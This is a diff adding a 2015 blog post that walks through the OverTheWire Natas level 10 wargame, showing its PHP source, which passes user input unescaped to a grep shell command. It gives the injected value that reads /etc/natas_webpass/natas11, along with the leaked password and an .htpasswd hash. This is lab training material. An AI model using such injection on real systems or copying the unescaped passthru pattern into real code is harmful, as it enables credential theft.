@@ -1,0 +1,43 @@
+---
+layout: post
+title:  "Natas Level 10"
+date:   2015-09-28 19:45
+categories: natas wargame web overthewire
+author: Leander
+---
+This is a solution guide to the Natas10 Level at [overthewire](http://natas10.natas.labs.overthewire.org). This write-up was created on 28 September 2015.
+
+First connect to the website
+<ul><li>http://natas10.natas.labs.overthewire.org</li>
+<li>Enter the following as the username natas9 and password nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</li></ul>
+
+Let's begin first by clicking on view source and examining the code for this level.
+{% highlight php linenos %}
+<?php
+$key = "";
+ 
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }}?>
+{% endhighlight %}
+
+This challenge is very similar to the last challenge except that it filters and checks for the following characters <code>[;|&]</code>. After the check it still uses the same php function called *passthru()*. If you want to learn more about *passthru()* check out this [link](http://php.net/manual/en/function.passthru.php). So now we have to find a way to send *passthru()* a command which will show us the flag inside /etc/natas_webpass/natas11.
+
+This time we are going to send grep an actual valid command to search for our key. You can find more about grep [here](http://www.tutorialspoint.com/unix_commands/grep.htm). Of note we know that we don't have to worry about case due to the *-i* switch, and we also know that grep expects to have a pattern to search for followed by a named input file. So let's try searching for all text with .* in the /etc/natas_webpass/natas11 directory.
+<code> .* /etc/natas_webpass/natas11 #</code>
+
+Which returns our password on the last line:
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.htaccess:AuthType Basic
+.htaccess: AuthName "Authentication required"
+.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
+.htaccess: require valid-user
+.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</code></pre></figure>
+
+The password is natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
